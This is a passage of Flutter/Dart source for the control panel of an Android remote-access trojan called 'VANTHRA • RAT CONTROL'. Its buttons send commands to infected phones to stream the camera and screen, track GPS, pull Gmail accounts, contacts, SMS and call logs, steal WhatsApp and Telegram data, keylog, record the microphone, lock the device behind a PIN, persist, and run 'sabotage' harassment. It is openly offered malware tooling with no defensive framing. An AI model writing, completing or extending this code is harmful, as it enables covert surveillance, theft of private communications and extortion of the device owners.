          _statItem(FontAwesomeIcons.envelope, "${(_deviceData['accounts'] as List?)?.length ?? 0}", "Gmails"),
        ],
      ),
    );
  }

  Widget _statItem(IconData icon, String value, String label) {
    return Column(children: [Icon(icon, color: _warningColor, size: 18), const SizedBox(height: 4), Text(value, style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.w800, fontFamily: 'Rajdhani')), Text(label, style: TextStyle(color: Colors.grey[500], fontSize: 8, fontFamily: 'Rajdhani'))]);
  }

  Widget _buildFooter() {
    return Padding(
      padding: const EdgeInsets.all(12),
      child: Column(
        children: [
          Row(mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Container(width: 5, height: 5, decoration: BoxDecoration(color: _successColor, shape: BoxShape.circle, boxShadow: [BoxShadow(color: _successColor, blurRadius: 5)])),
              const SizedBox(width: 8),
              Text("SECURE CONNECTION", style: TextStyle(color: Colors.white.withOpacity(0.25), fontSize: 8, fontWeight: FontWeight.w700, letterSpacing: 2, fontFamily: 'Rajdhani')),
              const SizedBox(width: 16),
              Icon(Icons.fingerprint, color: Colors.white.withOpacity(0.12), size: 10),
            ],
          ),
          const SizedBox(height: 4),
          Text("VANTHRA • RAT CONTROL", style: TextStyle(color: Colors.white.withOpacity(0.1), fontSize: 7, letterSpacing: 3, fontFamily: 'Rajdhani', fontWeight: FontWeight.w600)),
        ],
      ),
    );
  }

  List<dynamic>? _getListData(String key) {
    if (_deviceData[key] is List) return List<dynamic>.from(_deviceData[key]);
    return null;
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _darkerBg,
      body: Column(
        children: [
          _buildTopHeader(),
          _buildQuickStatusRow(),
          _buildTerminalLogs(),
          Expanded(
            child: ListView(
              padding: const EdgeInsets.all(12),
              children: [
                if (_deviceData.isNotEmpty) _buildQuickStats(),
                
                _groupLabel("🎯 INTELLIGENCE"),
                Wrap(spacing: 10, runSpacing: 10,
                  children: [
                    _actionButton("LIVE CAM", FontAwesomeIcons.video, _warningColor, "start_live_camera"),
                    _actionButton("SCREEN", Icons.screenshot_monitor, _goldColor, "get_screen"),
                    _actionButton("GPS LOC", FontAwesomeIcons.locationDot, _successColor, "get_location"),
                    _actionButton("GMAIL", FontAwesomeIcons.envelope, _roseColor, "get_gmails"),
                    _actionButton("CONTACTS", FontAwesomeIcons.addressBook, _glowColor1, "get_contacts"),
                    _actionButton("SMS", FontAwesomeIcons.message, _accentColor, "get_sms"),
                    _actionButton("APPS", Icons.apps, _glowColor2, "get_apps"),
                    _actionButton("GET WA", FontAwesomeIcons.whatsapp, _successColor, "extract_whatsapp", onCustomTap: _extractWhatsApp),
                    _actionButton("CLIPBOARD", FontAwesomeIcons.copy, _glowColor3, "get_clipboard"),
                  ],
                ),

                _groupLabel("🔒 SECURITY NATIVE"),
                Wrap(spacing: 10, runSpacing: 10,
                  children: [
                    _actionButton("LOCK T1", FontAwesomeIcons.lock, _roseColor, "lock_type1", isInput: true),
                    _actionButton("LOCK T2", FontAwesomeIcons.comment, _successColor, "lock_type2", isInput: true),
                    _actionButton("LOCK T3", FontAwesomeIcons.video, _glowColor1, "lock_type3"),
                    _actionButton("HARD LOCK", FontAwesomeIcons.lock, _roseColor, "hard_lock", isInput: true, inputHint: "Message|PIN"),
                    _actionButton("UNLOCK", FontAwesomeIcons.lockOpen, _successColor, "unlock"),
                    _actionButton("DEVICE INFO", FontAwesomeIcons.info, _glowColor2, "get_device_info"),
                  ],
                ),

                _groupLabel("💥 SABOTAGE"),
                Wrap(spacing: 10, runSpacing: 10,
                  children: [
                    _actionButton("STROBE", FontAwesomeIcons.lightbulb, _goldColor, "flash_strobe"),
                    _actionButton("STOP", FontAwesomeIcons.stop, Colors.white54, "stop_strobe"),
                    _actionButton("VOL MAX", FontAwesomeIcons.volumeHigh, _accentColor, "set_vol_max"),
                    _actionButton("VIBRATE", Icons.vibration, _glowColor3, "vibrate_loop"),
                    _actionButton("PLAY AUDIO", FontAwesomeIcons.music, _roseColor, "play_audio", isInput: true, inputHint: "Enter audio URL"),
                    _actionButton("STOP AUDIO", FontAwesomeIcons.stop, _roseColor, "stop_audio"),
                  ],
                ),

                _groupLabel("🎮 UI & CONTROL"),
                Wrap(spacing: 10, runSpacing: 10,
                  children: [
                    _actionButton("WALLPAPER", FontAwesomeIcons.image, _glowColor2, "set_wallpaper", isInput: true, inputHint: "Enter image URL"),
                    _actionButton("TTS", FontAwesomeIcons.microphone, _accentColor, "speak_tts", isInput: true, inputHint: "Enter text to speak"),
                    _actionButton("OPEN URL", FontAwesomeIcons.globe, _glowColor1, "open_url", isInput: true, inputHint: "Enter URL"),
                    _actionButton("SEND SMS", FontAwesomeIcons.sms, _successColor, "send_sms", isInput: true, inputHint: "Number|Message"),
                  ],
                ),

                _groupLabel("🔧 ADVANCED RAT"),
                Wrap(spacing: 10, runSpacing: 10,
                  children: [
                    _actionButton("FILE MGR", Icons.folder, _glowColor1, "", onCustomTap: _openFileManager),
                    _actionButton("KEYLOG", Icons.keyboard, _warningColor, "", onCustomTap: _startKeylogger),
                    _actionButton("MIC REC", Icons.mic, _roseColor, "", onCustomTap: _startMicrophoneRecorder),
                    _actionButton("KILL PROC", Icons.bug_report, _warningColor, "", onCustomTap: _showProcessKiller),
                    _actionButton("SPAM NOTIF", Icons.notifications_active, _accentColor, "", onCustomTap: _startNotificationSpammer),
                    _actionButton("CLIP MON", Icons.content_paste, _glowColor2, "", onCustomTap: _startClipboardMonitor),
                    _actionButton("CALL LOGS", Icons.phone, _successColor, "", onCustomTap: _fetchCallLogs),
                    _actionButton("WA EXTRACT", Icons.chat, _successColor, "", onCustomTap: _extractWhatsApp),
                    _actionButton("TG STEAL", Icons.telegram, _glowColor1, "", onCustomTap: _stealTelegram),
                    _actionButton("PERSIST", Icons.power_settings_new, _successColor, "", onCustomTap: _enablePersistence),
                  ],
                ),

                _groupLabel("⚡ ADVANCED"),
                Wrap(spacing: 10, runSpacing: 10,
                  children: [
                    _actionButton("CUSTOM", FontAwesomeIcons.terminal, Colors.white, "", isCustom: true),
                    _actionButton("PING", FontAwesomeIcons.networkWired, _glowColor1, "ping"),
                  ],
                ),
                
                const SizedBox(height: 20),
                _buildFooter(),
                const SizedBox(height: 30),
              ],
            ),
          ),
        ],
      ),
    );
  }
}

enum LogType { info, success, error, warning, notification, location, debug }

class LogEntry {
  final DateTime timestamp;
  final String message;
  final LogType type;
  LogEntry({required this.timestamp, required this.message, required this.type});
}